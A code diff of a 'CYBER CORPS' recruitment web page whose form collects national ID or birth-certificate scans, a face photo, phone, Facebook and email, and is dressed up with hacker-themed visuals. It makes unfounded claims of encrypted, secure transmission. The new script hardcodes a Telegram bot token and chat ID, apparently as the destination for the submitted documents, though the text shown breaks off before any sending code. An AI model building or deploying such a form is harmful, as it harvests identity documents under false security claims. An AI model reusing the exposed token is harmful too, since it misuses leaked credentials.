@@ -5,39 +5,23 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>CYBER CORPS | ELITE RECRUITMENT</title>
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
-/* CORE SYSTEM STYLESHEET - VERSION 5.0 [ENHANCED] */
+/* 
+    CORE SYSTEM STYLESHEET 
+    VERSION: 4.0.1 [STABLE]
+    THEME: CRIMSON PROTOCOL
+*/
+
 :root {
     --primary: #ff003c;
     --secondary: #00f3ff;
-    --accent: #9d00ff;
     --alert: #ffe600;
-    --success: #00ff9d;
     --dark: #0a0a0a;
-    --panel: rgba(15, 15, 15, 0.92);
-    --glass: rgba(255, 0, 60, 0.08);
-    --border: 1px solid rgba(255, 0, 60, 0.4);
+    --panel: rgba(15, 15, 15, 0.85);
+    --glass: rgba(255, 0, 60, 0.05);
+    --border: 1px solid rgba(255, 0, 60, 0.3);
     --font-main: 'Orbitron', sans-serif;
     --font-code: 'Share Tech Mono', monospace;
-    --glow-primary: 0 0 20px rgba(255, 0, 60, 0.6);
-    --glow-secondary: 0 0 20px rgba(0, 243, 255, 0.4);
-}
-
-/* THEME VARIANTS */
-[data-theme="neon"] {
-    --primary: #00ff9d;
-    --secondary: #ff00f7;
-    --accent: #00f3ff;
-    --glow-primary: 0 0 20px rgba(0, 255, 157, 0.6);
-}
-[data-theme="stealth"] {
-    --primary: #555;
-    --secondary: #888;
-    --accent: #333;
-    --dark: #000;
-    --panel: rgba(5, 5, 5, 0.95);
-    --glow-primary: none;
 }
 
 * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
@@ -47,428 +31,268 @@ body {
     color: #fff;
     font-family: var(--font-code);
     overflow-x: hidden;
-    min-height: 100vh;    display: flex;
+    min-height: 100vh;
+    display: flex;
     justify-content: center;
     align-items: center;
     perspective: 1000px;
-    transition: background 0.5s ease;
 }
 
-/* PARTICLE BACKGROUND */
-#particleCanvas {
-    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-    z-index: -3; opacity: 0.4;
-}
-
+/* BACKGROUND CANVAS */
 #matrixCanvas {
-    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-    z-index: -2; opacity: 0.25;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: -2;
+    opacity: 0.3;
 }
 
-/* SCANLINE & NOISE OVERLAY */
-.scanlines {
-    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-    background: repeating-linear-gradient(
-        to bottom,
-        rgba(255,255,255,0) 0px,
-        rgba(255,255,255,0) 1px,
-        rgba(0,0,0,0.15) 1px,
-        rgba(0,0,0,0.15) 2px
-    );
-    z-index: 10; pointer-events: none; opacity: 0.5;
-    animation: scanMove 8s linear infinite;
-}
-@keyframes scanMove { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }
-
-.noise {
-    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.08'/%3E%3C/svg%3E");
-    z-index: 11; pointer-events: none; opacity: 0.3;
+/* SCANLINE OVERLAY */.scanlines {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2));
+    background-size: 100% 4px;
+    z-index: 10;
+    pointer-events: none;
+    opacity: 0.6;
 }
 
-/* HUD HEADER */
+/* HEADER HUD */
 .hud-header {
-    position: fixed; top: 0; width: 100%; height: 70px;
-    background: rgba(0,0,0,0.95);
+    position: fixed;
+    top: 0;
+    width: 100%;
+    height: 60px;
+    background: rgba(0,0,0,0.9);
     border-bottom: 2px solid var(--primary);
-    display: flex; justify-content: space-between; align-items: center;
-    padding: 0 25px; z-index: 100;
-    box-shadow: var(--glow-primary);
-    backdrop-filter: blur(5px);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0 30px;
+    z-index: 100;
+    box-shadow: 0 0 20px var(--primary);
 }
+
 .brand {
-    display: flex; align-items: center; gap: 12px;
-    font-family: var(--font-main); font-size: 22px;
-    color: var(--primary); text-shadow: var(--glow-primary);
+    font-family: var(--font-main);
+    font-size: 24px;
+    color: var(--primary);
+    text-shadow: 0 0 10px var(--primary);
     letter-spacing: 2px;
 }
-.brand img {
-    height: 45px; border: 2px solid var(--primary);
-    border-radius: 3px; filter: drop-shadow(0 0 8px var(--primary));
-    transition: transform 0.3s;
-}
-.brand img:hover { transform: scale(1.05) rotate(2deg); }
 
-.status-panel {
-    display: flex; align-items: center; gap: 20px;
-    font-size: 11px; color: var(--secondary);
+.status-indicator {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 12px;
+    color: var(--secondary);
 }
 
-.status-dot {
-    width: 8px; height: 8px; border-radius: 50%;
-    background: var(--success); box-shadow: 0 0 10px var(--success);
-    animation: pulse 2s infinite;
-}
-@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
-
-/* THEME TOGGLE */
-.theme-toggle {
-    display: flex; gap: 5px; background: rgba(255,255,255,0.1);
-    padding: 3px; border-radius: 20px; border: 1px solid var(--border);
-}
-.theme-btn {
-    padding: 5px 12px; font-size: 10px; cursor: pointer;
-    background: transparent; border: none; color: #666;
-    font-family: var(--font-code); transition: 0.3s;
-    border-radius: 15px;
-}
-.theme-btn.active {
-    background: var(--primary); color: #000;
-    box-shadow: var(--glow-primary); font-weight: bold;
-}
+.blink { animation: blinker 1s linear infinite; }
+@keyframes blinker { 50% { opacity: 0; } }
 
 /* MAIN CONTAINER */
 .main-frame {
-    width: 100%; max-width: 700px;
-    background: var(--panel); backdrop-filter: blur(15px);
-    border: var(--border); padding: 35px 40px;
-    margin-top: 70px; position: relative;
+    width: 100%;
+    max-width: 650px;    background: var(--panel);
+    backdrop-filter: blur(10px);
+    border: var(--border);
+    padding: 40px;
+    margin-top: 60px;
+    position: relative;
     transform-style: preserve-3d;
-    box-shadow: 0 10px 60px rgba(0,0,0,0.7), var(--glow-primary);
-    transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);    border-radius: 5px;
+    box-shadow: 0 0 50px rgba(0,0,0,0.8);
+    transition: transform 0.3s;
 }
-.main-frame:hover { transform: translateY(-3px) rotateX(1deg); }
 
-/* CORNER DECORATIONS - ENHANCED */
+/* CORNER DECORATIONS */
 .corner {
-    position: absolute; width: 40px; height: 40px;
-    border: 2px solid var(--primary); transition: 0.4s;
-    pointer-events: none;
+    position: absolute;
+    width: 30px; height: 30px;
+    border: 2px solid var(--primary);
+    transition: 0.3s;
 }
 .c-tl { top: -2px; left: -2px; border-right: none; border-bottom: none; }
 .c-tr { top: -2px; right: -2px; border-left: none; border-bottom: none; }
 .c-bl { bottom: -2px; left: -2px; border-right: none; border-top: none; }
 .c-br { bottom: -2px; right: -2px; border-left: none; border-top: none; }
-.main-frame:hover .corner {
-    width: 60px; height: 60px;
-    box-shadow: 0 0 25px var(--primary);
-    border-width: 3px;
-}
 
-/* GLITCH TITLE - ENHANCED */
+.main-frame:hover .corner { width: 50px; height: 50px; box-shadow: 0 0 15px var(--primary); }
+
+/* GLITCH TITLE */
 .glitch-title {
-    font-family: var(--font-main); font-size: 30px;
-    text-align: center; margin: 10px 0 35px;
-    position: relative; color: #fff;
-    text-transform: uppercase; letter-spacing: 3px;
-    text-shadow: 0 0 10px var(--primary);
+    font-family: var(--font-main);
+    font-size: 28px;
+    text-align: center;
+    margin-bottom: 30px;
+    position: relative;
+    color: #fff;
+    text-transform: uppercase;
 }
 .glitch-title::before, .glitch-title::after {
-    content: attr(data-text); position: absolute; top: 0; left: 0;
-    width: 100%; height: 100%; background: var(--dark);
-    opacity: 0.8;
+    content: attr(data-text);
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: var(--dark);
 }
 .glitch-title::before {
-    left: 3px; text-shadow: -2px 0 var(--primary);
-    clip: rect(20px, 600px, 85px, 0);
-    animation: glitch-anim-2 2.5s infinite linear alternate-reverse;
+    left: 2px; text-shadow: -1px 0 red; clip: rect(24px, 550px, 90px, 0);
+    animation: glitch-anim-2 3s infinite linear alternate-reverse;
 }
 .glitch-title::after {
-    left: -3px; text-shadow: -2px 0 var(--secondary);
-    clip: rect(80px, 600px, 130px, 0);
-    animation: glitch-anim 2s infinite linear alternate-reverse;
+    left: -2px; text-shadow: -1px 0 blue; clip: rect(85px, 550px, 140px, 0);
+    animation: glitch-anim 2.5s infinite linear alternate-reverse;
 }
 @keyframes glitch-anim {
-    0% { clip: rect(12px, 9999px, 35px, 0); transform: skew(0.5deg); }
-    25% { clip: rect(75px, 9999px, 95px, 0); transform: skew(-0.3deg); }
-    50% { clip: rect(15px, 9999px, 55px, 0); transform: skew(0.2deg); }
-    75% { clip: rect(65px, 9999px, 85px, 0); transform: skew(-0.4deg); }
-    100% { clip: rect(90px, 9999px, 110px, 0); transform: skew(0.1deg); }
-}@keyframes glitch-anim-2 {
-    0% { clip: rect(25px, 9999px, 45px, 0); transform: skew(-0.3deg); }
-    30% { clip: rect(85px, 9999px, 105px, 0); transform: skew(0.4deg); }
-    60% { clip: rect(20px, 9999px, 60px, 0); transform: skew(-0.2deg); }
-    100% { clip: rect(95px, 9999px, 115px, 0); transform: skew(0.3deg); }
+    0% { clip: rect(10px, 9999px, 30px, 0); }
+    20% { clip: rect(80px, 9999px, 100px, 0); }
+    40% { clip: rect(10px, 9999px, 50px, 0); }
+    60% { clip: rect(60px, 9999px, 80px, 0); }
+    80% { clip: rect(30px, 9999px, 40px, 0); }
+    100% { clip: rect(90px, 9999px, 100px, 0); }
 }
 
 /* FORM ELEMENTS */
-.input-group { margin-bottom: 22px; position: relative; }
+.input-group { margin-bottom: 20px; position: relative; }
+
 label {
-    display: block; font-size: 11px; color: var(--primary);
-    margin-bottom: 6px; letter-spacing: 1.5px;
-    text-transform: uppercase; font-weight: bold;
-}
-input, textarea, select {
-    width: 100%; background: rgba(0,0,0,0.5);
-    border: 1px solid #333; border-left: 3px solid #444;
-    padding: 14px 15px; color: #fff;
-    font-family: var(--font-code); font-size: 15px;
-    outline: none; transition: 0.3s;
-    border-radius: 2px;
-}
-input:focus, textarea:focus {
-    border-color: var(--primary); border-left: 3px solid var(--primary);
-    box-shadow: 0 0 20px rgba(255, 0, 60, 0.25);
-    background: rgba(25, 0, 5, 0.6);
-}
-input::placeholder, textarea::placeholder {
-    color: #555; font-style: italic;
+    display: block;
+    font-size: 12px;
+    color: var(--primary);
+    margin-bottom: 5px;
+    letter-spacing: 1px;
 }
 
-/* CUSTOM RADIO SWITCH - UPGRADED */
-.switch-container {
-    display: flex; gap: 12px; margin-bottom: 25px;
-    background: rgba(0,0,0,0.3); padding: 5px;
-    border-radius: 30px; border: 1px solid var(--border);
+input, textarea, select {
+    width: 100%;
+    background: rgba(0,0,0,0.6);
+    border: 1px solid #333;
+    border-left: 3px solid #333;
+    padding: 12px;
+    color: #fff;
+    font-family: var(--font-code);
+    font-size: 16px;
+    outline: none;
+    transition: 0.3s;
 }
-.cyber-radio { flex: 1; position: relative; }
+
+input:focus, textarea:focus {
+    border-color: var(--primary);
+    border-left: 3px solid var(--primary);
+    box-shadow: 0 0 15px rgba(255, 0, 60, 0.2);
+    background: rgba(20, 0, 0, 0.5);
+}
+
+/* CUSTOM RADIO SWITCH */
+.switch-container {
+    display: flex;
+    gap: 15px;
+    margin-bottom: 20px;
+}
+.cyber-radio {
+    flex: 1;
+    position: relative;}
 .cyber-radio input { display: none; }
 .cyber-radio label {
-    display: block; text-align: center; padding: 12px 8px;
-    background: transparent; border: none;
-    cursor: pointer; transition: 0.3s;
-    color: #777; font-size: 12px; font-weight: 500;
-    border-radius: 25px;
+    display: block;
+    text-align: center;
+    padding: 10px;
+    background: rgba(0,0,0,0.5);
+    border: 1px solid #333;
+    cursor: pointer;
+    transition: 0.3s;
+    color: #666;
 }
 .cyber-radio input:checked + label {
-    background: var(--primary); color: #000;
-    box-shadow: var(--glow-primary);
-    font-weight: 700; transform: scale(1.02);}
+    background: var(--primary);
+    color: #000;
+    border-color: var(--primary);
+    box-shadow: 0 0 15px var(--primary);
+    font-weight: bold;
+}
 
-/* UPLOAD ZONES - ENHANCED */
+/* UPLOAD ZONES */
 .upload-zone {
-    border: 2px dashed #444; padding: 25px 20px;
-    text-align: center; cursor: pointer;
-    margin-bottom: 18px; transition: 0.3s;
-    background: rgba(0,0,0,0.25);
-    border-radius: 5px; position: relative;
-    overflow: hidden;
+    border: 1px dashed #444;
+    padding: 20px;
+    text-align: center;
+    cursor: pointer;
+    margin-bottom: 15px;
+    transition: 0.3s;
+    background: rgba(0,0,0,0.3);
 }
-.upload-zone::before {
-    content: ''; position: absolute; top: 0; left: -100%;
-    width: 100%; height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
-    transition: 0.5s;
-}
-.upload-zone:hover::before { left: 100%; }
-.upload-zone:hover {
-    border-color: var(--secondary);
-    background: rgba(0, 243, 255, 0.08);
-    box-shadow: var(--glow-secondary);
-}
-.upload-zone i {
-    font-size: 28px; color: var(--secondary);
-    display: block; margin-bottom: 8px;
-    text-shadow: 0 0 10px var(--secondary);
-}
-.upload-zone span {
-    font-size: 13px; color: #aaa; display: block;
-}
-.preview-img {
-    width: 100%; max-height: 180px; object-fit: contain;
-    margin-top: 12px; display: none;
-    border: 2px solid var(--primary); border-radius: 3px;
-    box-shadow: 0 0 15px rgba(255, 0, 60, 0.3);
-    animation: fadeIn 0.4s ease;
-}
-@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+.upload-zone:hover { border-color: var(--secondary); background: rgba(0, 243, 255, 0.05); }
+.upload-zone i { font-size: 24px; color: #555; display: block; margin-bottom: 5px; }
+.preview-img { width: 100%; max-height: 150px; object-fit: contain; margin-top: 10px; display: none; border: 1px solid var(--primary); }
 
-/* BIOMETRIC SCAN ANIMATION */
-.biometric-wrapper { position: relative; }
-.scan-line {
-    position: absolute; top: 0; left: 0; right: 0;
-    height: 3px; background: var(--secondary);
-    box-shadow: 0 0 15px var(--secondary);
-    animation: scanLine 2s ease-in-out infinite;
-    display: none; border-radius: 2px;
-}
-@keyframes scanLine {    0%, 100% { top: 0; opacity: 0; }
-    10% { opacity: 1; }
-    50% { top: 100%; opacity: 1; }
-    90% { opacity: 0; }
-}
-.upload-zone.scanning .scan-line { display: block; }
-.upload-zone.scanning { border-color: var(--secondary); animation: pulseBorder 1.5s infinite; }
-@keyframes pulseBorder {
-    0%, 100% { box-shadow: 0 0 10px var(--secondary); }
-    50% { box-shadow: 0 0 25px var(--secondary), 0 0 40px var(--secondary); }
-}
-
-/* PROGRESS BAR */
-.progress-container {
-    margin: 20px 0; display: none;
-}
-.progress-label {
-    display: flex; justify-content: space-between;
-    font-size: 11px; color: var(--secondary);
-    margin-bottom: 5px;
-}
-.progress-bar {
-    height: 6px; background: #222; border-radius: 3px;
-    overflow: hidden; border: 1px solid #444;
-}
-.progress-fill {
-    height: 100%; width: 0%;
-    background: linear-gradient(90deg, var(--primary), var(--secondary));
-    transition: width 0.3s ease;
-    box-shadow: 0 0 10px var(--primary);
-}
-
-/* CONSOLE LOG - ENHANCED */
+/* CONSOLE LOG AREA */
 .console-log {
-    background: #000; border: 1px solid #333;
-    height: 120px; overflow-y: auto;
-    padding: 12px; font-size: 11px;
-    color: #0f0; margin-top: 25px;
-    font-family: monospace; opacity: 0.9;
-    border-radius: 3px;
-    box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.1);
+    background: #000;
+    border: 1px solid #333;
+    height: 100px;
+    overflow-y: auto;
+    padding: 10px;
+    font-size: 11px;
+    color: #0f0;
+    margin-top: 20px;
+    font-family: monospace;
+    opacity: 0.8;
 }
-.log-entry {
-    margin-bottom: 3px; padding-left: 15px;
-    position: relative; border-left: 2px solid transparent;
-    animation: slideIn 0.2s ease;
-}
-@keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
-.log-entry::before {
-    content: '>'; position: absolute; left: 3px;    color: var(--primary); font-weight: bold;
-}
-.log-warn { color: var(--alert); border-left-color: var(--alert); }
-.log-err { color: var(--primary); border-left-color: var(--primary); }
-.log-success { color: var(--success); border-left-color: var(--success); }
-
-/* TYPING INDICATOR */
-.typing::after {
-    content: '▋'; animation: blink 1s infinite;
-    color: var(--secondary);
-}
-@keyframes blink { 50% { opacity: 0; } }
-
-/* SUBMIT BUTTON - UPGRADED */
+.log-entry { margin-bottom: 2px; }
+.log-warn { color: var(--alert); }
+.log-err { color: var(--primary); }
+/* SUBMIT BUTTON */
 .btn-submit {
-    width: 100%; padding: 18px;
+    width: 100%;
+    padding: 15px;
     background: transparent;
     border: 2px solid var(--primary);
     color: var(--primary);
     font-family: var(--font-main);
-    font-size: 16px; font-weight: 900;
-    letter-spacing: 4px; text-transform: uppercase;
-    cursor: pointer; position: relative;
-    overflow: hidden; transition: 0.4s;
-    margin-top: 25px; border-radius: 3px;
-    box-shadow: var(--glow-primary);
+    font-size: 18px;
+    font-weight: 900;
+    letter-spacing: 3px;
+    cursor: pointer;
+    position: relative;
+    overflow: hidden;
+    transition: 0.3s;
+    margin-top: 20px;
 }
-.btn-submit::before {
-    content: ''; position: absolute; top: 0; left: -100%;
-    width: 100%; height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-    transition: 0.5s;
-}
-.btn-submit:hover::before { left: 100%; }
-.btn-submit:hover {
-    background: var(--primary); color: #000;
-    box-shadow: 0 0 40px var(--primary);
-    transform: translateY(-2px);
-}
-.btn-submit:disabled {
-    border-color: #555; color: #555;
-    cursor: not-allowed; box-shadow: none;
-    background: transparent; transform: none;
-}
-.btn-submit.success {
-    border-color: var(--success); color: var(--success);
-    box-shadow: 0 0 30px var(--success);
-    animation: successPulse 0.5s ease;
-}
-@keyframes successPulse {    0% { transform: scale(1); }
-    50% { transform: scale(1.02); }
-    100% { transform: scale(1); }
-}
-
-/* SECURITY BADGE */
-.security-badge {
-    display: flex; align-items: center; gap: 8px;
-    justify-content: center; margin-top: 20px;
-    padding: 10px; background: rgba(0, 255, 157, 0.1);
-    border: 1px solid var(--success); border-radius: 3px;
-    font-size: 11px; color: var(--success);
-}
-.security-badge i { animation: rotateShield 3s linear infinite; }
-@keyframes rotateShield { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+.btn-submit:hover { background: var(--primary); color: #000; box-shadow: 0 0 30px var(--primary); }
+.btn-submit:disabled { border-color: #555; color: #555; cursor: not-allowed; box-shadow: none; background: transparent; }
 
 /* HIDDEN UTILS */
 .hidden { display: none !important; }
 
-/* RESPONSIVE */
-@media (max-width: 768px) {
-    .hud-header { padding: 0 15px; height: 60px; }
-    .brand { font-size: 18px; }
-    .brand img { height: 35px; }
-    .status-panel { gap: 10px; font-size: 10px; }
-    .main-frame {
-        margin-top: 60px; padding: 25px 20px;
-        max-width: 95%;
-    }
-    .glitch-title { font-size: 24px; }
-    .switch-container { flex-direction: column; border-radius: 10px; }
-    .cyber-radio label { padding: 10px; }
-}
-
 /* SCROLLBAR */
-::-webkit-scrollbar { width: 6px; }
-::-webkit-scrollbar-track { background: #0a0a0a; }
-::-webkit-scrollbar-thumb {
-    background: var(--primary); border-radius: 3px;
-}
-::-webkit-scrollbar-thumb:hover { background: var(--secondary); }
+::-webkit-scrollbar { width: 5px; }
+::-webkit-scrollbar-track { background: #000; }
+::-webkit-scrollbar-thumb { background: var(--primary); }
 
-/* ACCESSIBILITY */
-@media (prefers-reduced-motion: reduce) {
-    * { animation: none !important; transition: none !important; }
-}
 </style>
 </head>
 <body>
+
 <!-- VISUAL LAYERS -->
-<canvas id="particleCanvas"></canvas>
 <canvas id="matrixCanvas"></canvas>
 <div class="scanlines"></div>
-<div class="noise"></div>
+
+<!-- AUDIO SYSTEM (Generated via JS later, placeholders here) -->
 
 <!-- HUD HEADER -->
 <div class="hud-header">
-    <div class="brand">
-        <img src="https://i.postimg.cc/bNsVzRSn/IMG-20260307-201742-901.png" alt="CYBER CORPS">
-        CYBER<span style="color:#fff">CORPS</span>
-    </div>
-    
-    <div class="status-panel">
-        <div class="theme-toggle">
-            <button class="theme-btn active" data-theme="crimson">CRIMSON</button>
-            <button class="theme-btn" data-theme="neon">NEON</button>
-            <button class="theme-btn" data-theme="stealth">STEALTH</button>
-        </div>
-        <div style="display:flex; align-items:center; gap:8px;">
-            <div class="status-dot"></div>
-            <span>SECURE</span>
-        </div>
-        <span id="clock" style="color:var(--alert); font-weight:bold;">00:00:00</span>
+    <div class="brand">CYBER<span style="color:#fff">CORPS</span></div>
+    <div class="status-indicator">
+        <span class="blink">●</span> SECURE CONNECTION ESTABLISHED
+        <span id="clock">00:00:00</span>
     </div>
 </div>
 
 <!-- MAIN INTERFACE -->
-<div class="main-frame" id="frame3d">
-    <div class="corner c-tl"></div><div class="corner c-tr"></div>
+<div class="main-frame" id="frame3d">    <div class="corner c-tl"></div><div class="corner c-tr"></div>
     <div class="corner c-bl"></div><div class="corner c-br"></div>
 
     <h1 class="glitch-title" data-text="AGENT REGISTRATION">AGENT REGISTRATION</h1>
@@ -477,43 +301,38 @@ input::placeholder, textarea::placeholder {
         
         <!-- IDENTITY SECTION -->
         <div class="input-group">
-            <label><i class="fas fa-fingerprint"></i> CODENAME / FULL NAME</label>
-            <input type="text" id="name" required placeholder="ENTER IDENTIFIER..." autocomplete="off" maxlength="50">
+            <label>CODENAME / FULL NAME</label>
+            <input type="text" id="name" required placeholder="ENTER IDENTIFIER..." autocomplete="off">
         </div>
 
         <div class="switch-container">
             <div class="cyber-radio">
                 <input type="radio" name="docType" id="typeNid" value="nid" checked onchange="toggleDocUI()">
-                <label for="typeNid"><i class="fas fa-id-card"></i> NID CARD</label>
+                <label for="typeNid">NID CARD</label>
             </div>
             <div class="cyber-radio">
                 <input type="radio" name="docType" id="typeBc" value="bc" onchange="toggleDocUI()">
-                <label for="typeBc"><i class="fas fa-certificate"></i> BIRTH CERT.</label>            </div>
+                <label for="typeBc">BIRTH CERT.</label>
+            </div>
         </div>
 
         <!-- DYNAMIC DOC UPLOAD -->
         <div id="ui-nid">
-            <div class="upload-zone" onclick="triggerUpload('fileNidFront')">
-                <div class="scan-line"></div>
-                <i class="fas fa-file-image"></i>
-                <span>TAP TO UPLOAD NID FRONT</span>
+            <div class="upload-zone" onclick="document.getElementById('fileNidFront').click()">
+                <i>📂</i> TAP TO UPLOAD NID FRONT
                 <input type="file" id="fileNidFront" hidden accept="image/*">
                 <img id="prevNidFront" class="preview-img">
             </div>
-            <div class="upload-zone" onclick="triggerUpload('fileNidBack')">
-                <div class="scan-line"></div>
-                <i class="fas fa-file-image"></i>
-                <span>TAP TO UPLOAD NID BACK</span>
+            <div class="upload-zone" onclick="document.getElementById('fileNidBack').click()">
+                <i>📂</i> TAP TO UPLOAD NID BACK
                 <input type="file" id="fileNidBack" hidden accept="image/*">
                 <img id="prevNidBack" class="preview-img">
             </div>
         </div>
 
         <div id="ui-bc" class="hidden">
-            <div class="upload-zone" onclick="triggerUpload('fileBc')">
-                <div class="scan-line"></div>
-                <i class="fas fa-file-contract"></i>
-                <span>TAP TO UPLOAD CERTIFICATE</span>
+            <div class="upload-zone" onclick="document.getElementById('fileBc').click()">
+                <i>📄</i> TAP TO UPLOAD CERTIFICATE
                 <input type="file" id="fileBc" hidden accept="image/*">
                 <img id="prevBc" class="preview-img">
             </div>
@@ -521,511 +340,287 @@ input::placeholder, textarea::placeholder {
 
         <!-- CONTACT SECTION -->
         <div class="input-group">
-            <label><i class="fas fa-user-shield"></i> PROFILE PHOTO (BIOMETRIC)</label>
-            <div class="upload-zone biometric-wrapper" onclick="triggerUpload('fileProfile')">
-                <div class="scan-line"></div>
-                <i class="fas fa-user-astronaut"></i>
-                <span>UPLOAD FACE SCAN</span>
+            <label>PROFILE PHOTO (BIOMETRIC)</label>
+            <div class="upload-zone" onclick="document.getElementById('fileProfile').click()">                <i>👤</i> UPLOAD FACE SCAN
                 <input type="file" id="fileProfile" hidden accept="image/*">
                 <img id="prevProfile" class="preview-img">
             </div>
         </div>
 
         <div class="input-group">
-            <label><i class="fas fa-satellite"></i> ENCRYPTED CONTACT (PHONE)</label>
-            <input type="tel" id="phone" required placeholder="+880..." pattern="^\+?[0-9\s\-]{10,15}$">
+            <label>ENCRYPTED CONTACT (PHONE)</label>
+            <input type="tel" id="phone" required placeholder="+880...">
         </div>
 
         <div class="input-group">
-            <label><i class="fas fa-globe"></i> DIGITAL FOOTPRINT (FACEBOOK)</label>            <input type="url" id="fb" required placeholder="https://facebook.com/username">
+            <label>DIGITAL FOOTPRINT (FACEBOOK)</label>
+            <input type="text" id="fb" required placeholder="URL...">
         </div>
 
         <div class="input-group">
-            <label><i class="fas fa-envelope"></i> EMAIL PROTOCOL</label>
-            <input type="email" id="email" required placeholder="agent@cybercorps.net">
+            <label>EMAIL PROTOCOL</label>
+            <input type="email" id="email" required placeholder="mail@server.com">
         </div>
 
         <div class="input-group">
-            <label><i class="fas fa-history"></i> PREVIOUS AFFILIATION</label>
-            <input type="text" id="prevTeam" placeholder="Optional - Leave blank if none">
+            <label>PREVIOUS AFFILIATION</label>
+            <input type="text" id="prevTeam" placeholder="Optional...">
         </div>
 
         <div class="input-group">
-            <label><i class="fas fa-bullseye"></i> MISSION STATEMENT</label>
-            <textarea id="reason" rows="3" placeholder="WHY DO YOU SEEK ENTRY? MAX 500 CHARS..." maxlength="500"></textarea>
+            <label>MISSION STATEMENT</label>
+            <textarea id="reason" rows="3" placeholder="WHY DO YOU SEEK ENTRY?"></textarea>
         </div>
 
-        <!-- PROGRESS INDICATOR -->
-        <div class="progress-container" id="progressContainer">
-            <div class="progress-label">
-                <span>UPLOAD PROGRESS</span>
-                <span id="progressPercent">0%</span>
-            </div>
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
-        </div>
-
-        <button type="submit" class="btn-submit" id="btnSubmit">
-            <i class="fas fa-link"></i> INITIATE UPLINK 📡
-        </button>
+        <button type="submit" class="btn-submit" id="btnSubmit">INITIATE UPLINK 📡</button>
         
-        <!-- SECURITY BADGE -->
-        <div class="security-badge">
-            <i class="fas fa-shield-alt"></i>
-            <span>END-TO-END ENCRYPTED • AES-256 • SECURE TRANSMISSION</span>
-        </div>
-
         <!-- FAKE CONSOLE -->
         <div class="console-log" id="sysLog">
-            <div class="log-entry">SYSTEM INITIALIZED v5.0</div>
-            <div class="log-entry">SECURITY PROTOCOL: ACTIVE</div>
-            <div class="log-entry typing">AWAITING AGENT INPUT</div>
+            <div class="log-entry">> SYSTEM INITIALIZED...</div>
+            <div class="log-entry">> WAITING FOR INPUT...</div>
         </div>
 
     </form>
 </div>
 
-<script>/**
- * CYBER CORPS PORTAL - CLIENT SIDE v5.0
- * ENHANCED SECURITY & VISUALS
+<script>
+/**
+ * CYBER CORPS PORTAL LOGIC
+ * AUTHOR: Qwen3.6
+ * VERSION: 4.0
  */
 
-// --- AUDIO SYSTEM (Web Audio API) ---
+// --- CONFIGURATION ---const CONFIG = {
+    botToken: "8661715983:AAE9fWQ31BRl-416XAhA3zFH1WMjHUEzSN4",
+    chatId: "8475718817",
+    soundEnabled: true
+};
+
+// --- AUDIO SYSTEM (Synthesizer) ---
 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
 function playSound(type) {
-    if (audioCtx.state === 'suspended') audioCtx.resume();
+    if (!CONFIG.soundEnabled) return;
     const osc = audioCtx.createOscillator();
     const gain = audioCtx.createGain();
-    osc.connect(gain); gain.connect(audioCtx.destination);
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+
+    if (type === 'type') {
+        osc.type = 'square';
+        osc.frequency.setValueAtTime(800, audioCtx.currentTime);
+        gain.gain.setValueAtTime(0.02, audioCtx.currentTime);
+        osc.start();
+        osc.stop(audioCtx.currentTime + 0.03);
+    } else if (type === 'hover') {
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(200, audioCtx.currentTime);
+        gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
+        osc.start();
+        osc.stop(audioCtx.currentTime + 0.05);
+    } else if (type === 'success') {
+        osc.type = 'triangle';
+        osc.frequency.setValueAtTime(400, audioCtx.currentTime);
+        osc.frequency.exponentialRampToValueAtTime(1000, audioCtx.currentTime + 0.1);
+        gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+        osc.start();
+        osc.stop(audioCtx.currentTime + 0.3);
+    } else if (type === 'error') {
+        osc.type = 'sawtooth';
+        osc.frequency.setValueAtTime(100, audioCtx.currentTime);
+        gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+        osc.start();
+        osc.stop(audioCtx.currentTime + 0.3);
+    }
+}
+
+// --- MATRIX EFFECT ---
+const canvas = document.getElementById("matrixCanvas");
+const ctx = canvas.getContext("2d");
+let width = canvas.width = window.innerWidth;
+let height = canvas.height = window.innerHeight;
+const cols = Math.floor(width / 20);
+const ypos = Array(cols).fill(0);
+function matrix() {
+    ctx.fillStyle = "#0001";
+    ctx.fillRect(0, 0, width, height);
+    ctx.fillStyle = "#f00"; // Red Matrix
